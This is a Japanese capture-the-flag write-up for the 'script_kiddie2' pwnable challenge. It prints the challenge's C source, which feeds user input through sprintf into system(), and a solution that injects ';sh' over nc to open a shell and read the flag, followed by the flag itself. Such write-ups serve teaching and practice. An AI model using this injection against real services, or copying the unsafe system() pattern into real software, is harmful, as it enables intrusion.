# script_kiddie2:Pwnable:30pts
もう少し制約を厳しくしてみました。  
```
nc 34.145.29.222 30007
```
[new_dist.zip](new_dist.zip)  

# Solution
いきなり2からだが、script_kiddieはチームメンバが解いていた。  
new_dist.zipを展開するとmain.cなどソースが出てくる。  
以下のようであった。  
```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// バッファリングを無効化して時間制限を60秒に設定
__attribute__((constructor)) void setup() {
  alarm(60);
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
}

void show_flag() {
  char flag_name[5] = {};
  printf("Which flag do you want?");
  read(0, flag_name, 5);

  char cmd[0x10];
  sprintf(cmd, "echo %s", flag_name);

  // show FLAG
  system(cmd);
}

int main() { show_flag(); }
```
5文字でOSコマンドインジェクションを行えばよいようだ。  
`;sh`でシェルが起動できるため、3文字しか必要ではない。  
以下のようにシェルをとる。  
```bash
$ (echo ";sh" ; cat) | nc 34.145.29.222 30007
Which flag do you want?
ls
flag
script_kiddie2
start.sh
cat flag
taskctf{sh_1s_als0_0k}
```
flagが得られた。  

## taskctf{sh_1s_als0_0k}